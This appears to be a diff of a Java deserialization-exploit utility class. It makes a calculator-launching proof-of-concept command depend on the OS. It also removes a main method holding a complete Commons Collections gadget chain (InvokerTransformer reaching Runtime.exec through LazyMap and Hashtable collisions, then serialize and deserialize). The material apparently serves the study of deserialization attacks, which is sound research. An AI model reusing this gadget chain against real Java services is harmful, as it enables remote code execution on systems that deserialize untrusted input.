@@ -25,7 +25,18 @@ import static expUtils.ReflectUtils.getClassByte;
 
 public class ExpUtils {
 
-    private static final String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
+    public static String cmd;
+
+    static {
+        cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
+        String osName = System.getProperty("os.name").toLowerCase();
+        String[] str =  osName.split(" ");
+        if (str[0].equals("windows")){
+            cmd = "calc";
+        }
+    }
+
+
 
     public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
         TemplatesImpl templates = new TemplatesImpl();
@@ -172,49 +183,7 @@ public class ExpUtils {
 
 
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
-        System.out.println(System.getProperty("java.version"));
-
-        Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
-                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
-                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
-        };
-        Transformer[] fakeTransformers = new Transformer[]{
-                new ConstantTransformer(1),
-        };
-
-        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
-
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
-        System.out.println(innerMap1==innerMap2);
-        System.out.println(innerMap2.hashCode());
-        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);  // 生成了LazyMap  不可反序列化的map
-        lazyMap1.put("yy",1);
-        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
-
-        lazyMap2.put("zZ",2);
-        System.out.println(lazyMap1.size());
-        System.out.println(lazyMap2.size());
-        System.out.println("-------");
-        System.out.println(lazyMap1.hashCode());
-        System.out.println(lazyMap2.hashCode());
-        Hashtable hashtable = new Hashtable();
-        hashtable.put(lazyMap1,3);
-        hashtable.put(lazyMap2,4);
-
-        System.out.println(lazyMap1.size());
-        System.out.println(lazyMap2.size());
-        ReflectUtils.setFields(chainedTransformer,"iTransformers", transformers);
-        lazyMap2.remove("zZ");
-        lazyMap2.put("zZ",1);
-        System.out.println("hashTableSize:" + hashtable.size() );
-//        lazyMap2.remove("yy");
-//        hashtable.remove("yy");
-        String path =  serialize(hashtable);
-        unserialize(path);
-//        System.out.println(obj);
+//        Runtime.getRuntime().exec("calc");
 
     }
 }
